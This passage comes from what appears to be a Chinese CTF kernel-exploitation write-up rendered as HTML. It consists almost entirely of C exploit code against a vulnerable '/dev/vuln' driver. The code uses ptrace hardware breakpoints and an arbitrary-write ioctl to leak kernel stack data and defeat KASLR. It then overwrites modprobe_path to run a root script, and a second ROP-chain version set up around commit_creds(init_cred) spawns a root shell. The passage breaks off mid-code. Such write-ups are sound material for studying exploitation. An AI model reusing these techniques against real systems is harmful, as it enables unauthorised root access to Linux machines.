class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<span class="hljs-comment">/*这里不绑核问题也不大🤔*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x80</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        uname(uts);<br>        <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>            write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    modprobe_path = modprobe_path + kernel_offset;<br>    arb_write(modprobe_path, <span class="hljs-number">0x7465672f706d742f</span>);<br>    arb_write(modprobe_path + <span class="hljs-number">8</span>, <span class="hljs-number">0x6c6c656873</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# make fake file magic not found&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/getshell&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# get flag&quot;</span>);<br>    <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (flag_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open flag failed!&quot;</span>);<br>    &#125;<br>    read(flag_fd, data, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] flag is %s\n&quot;</span>,data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202160016.png" style="zoom:50%;" /><h3 id="rop链解法"><a href="#rop链解法" class="headerlink" title="rop链解法"></a>rop链解法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810f8240</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8a820</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff820010b0</span> + <span class="hljs-number">54</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81852a3d</span>;<br><span class="hljs-type">size_t</span> ret = <span class="hljs-number">0xffffffff81000905</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810f8240</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8a820</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff820010b0</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x10</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span 